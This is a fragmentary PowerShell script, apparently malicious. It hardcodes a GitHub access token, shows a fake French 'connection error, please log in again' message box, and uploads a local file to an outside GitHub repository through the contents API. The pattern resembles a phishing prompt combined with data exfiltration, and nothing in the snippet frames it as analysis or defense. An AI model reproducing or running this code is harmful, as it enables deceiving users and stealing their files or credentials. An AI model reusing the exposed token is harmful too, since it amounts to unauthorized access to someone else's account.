...
$Token = "Bearer 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"
...
[System.Windows.Forms.MessageBox]::Show("Erreur de connexion. Merci de vous reconnecter")
...
$github = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$github.Add("Authorization", $Token)
$github.Add("ContentType", "application/gzip")
#Invoke-WebRequest -method POST -URI https://api.github.com/repos/Polochon02100/crl/contents/ -Token $Token
Invoke-WebRequest -Uri https://api.github.com/repos/Polochon02100/crl/contents/ -Method Post -InFile $SourceFilePath -Headers $github
